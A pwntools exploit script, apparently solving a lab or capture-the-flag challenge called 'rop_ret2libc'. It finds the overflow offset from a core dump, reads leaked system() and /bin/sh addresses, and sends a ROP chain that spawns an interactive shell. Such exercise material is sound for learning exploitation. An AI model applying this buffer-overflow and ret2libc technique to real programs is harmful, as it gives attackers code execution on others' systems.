from pwn import *

context.binary = binary = "./rop_ret2libc"

context.log_level = "debug"

elf = ELF(binary)
io = process(binary)

padding = cyclic(32)
padding += b"ABCD"
padding += cyclic(32)

io.recv()
io.sendline(padding)
io.wait()

corefile = Coredump("./core")

lenUntilRIP = cyclic_find(corefile.fault_addr) # string length until RIP is hit

print(hex(corefile.fault_addr))

firstPadding = cyclic(32)
cannary = b'ABCD'
secondPadding = cyclic(lenUntilRIP)

popRdi = p64(0x401288) # pop rdi ; ret

context.terminal = ["zsh"]

io = process(binary)

io.recvuntil("M: ")
systemAddr = io.recvn(14)
io.recvuntil("l: ")
binShAddr = io.recvn(8)
print(io.recv())

print("System Addr = " + str(systemAddr))
print("/bin/sh Addr = " + str(binShAddr))

payload = firstPadding
payload += cannary
payload += secondPadding
payload += popRdi
payload += p64(int(binShAddr, 16))
payload += p64(int(systemAddr, 16))

io.sendline(payload)
io.interactive()
